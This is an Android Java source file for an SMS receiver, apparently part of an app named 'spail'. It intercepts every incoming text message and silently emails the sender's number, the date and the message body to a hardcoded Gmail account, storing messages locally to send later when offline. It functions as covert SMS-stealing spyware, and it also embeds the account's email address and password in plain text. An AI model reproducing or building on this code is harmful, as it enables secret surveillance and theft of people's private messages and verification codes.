package com.dragfire.spail;

import java.util.Date;
import java.util.Random;
import java.util.Set;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.support.v4.content.LocalBroadcastManager;
import android.telephony.SmsMessage;
import android.text.format.Time;
import android.util.Log;

public class SmsMonitorService extends BroadcastReceiver
{
	private String PHONE_NUMBER, mailBody;
	private String username = "badampam@gmail.com", password = "badampam";
	private SpailDBHelper mailDbHelper;
	private int num_rows;

	@Override
	public void onReceive(Context c, Intent intent)
	{
		Log.i("SPAIL", "Message Received!");
		if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION
				.equals(intent.getAction()))
		{
			try
			{

			} catch (Exception e)
			{
				// TODO: handle exception
			}
			Log.i("SPAIL", "Inside Receiver method");
			Bundle bundle = intent.getExtras();
			SmsMessage[] msgs = null;
			String msgBody = "";

			if (null != bundle)
			{
				Log.i("SPAIL", "Inside Receiver bundle");
				Object[] pdus = (Object[]) bundle.get("pdus");
				msgs = new SmsMessage[pdus.length];
				mailDbHelper = new SpailDBHelper(c);
				for (int i = 0; i < msgs.length; i++)
				{
					mailBody = "";
					msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					msgBody = msgs[i].getMessageBody().toString().trim();
					num_rows = mailDbHelper.numberOfRows();
					if (num_rows > 0)
					{
						mailDbHelper.sendAllMail();
					}
					PHONE_NUMBER = msgs[i].getOriginatingAddress();
					mailBody += "Phone Number: " + PHONE_NUMBER + "\nDate: "
							+ (new Date().toString()) + "\n\nMessage: "
							+ msgBody;
					new Thread(new Runnable()
					{

						@Override
						public void run()
						{
							if (InternetMonitorService.isOnline())
							{
								Log.i("SPAIL", "Internet is online");
								try
								{
									MS mailSender = new MS(username, password);
									mailSender.sendMail(mailBody);
									Log.i("SPAIL", "Mail Sent!");
								} catch (Exception e)
								{
									e.printStackTrace();

								}
							} else
							{
								Log.i("SPAIL", "No internet connection\nInserting message to DB");
								// TODO: handle exception
								mailDbHelper.insertMessage(PHONE_NUMBER,
										mailBody);
							}

						}
					}).start();

				}

			}
		}

	}
}
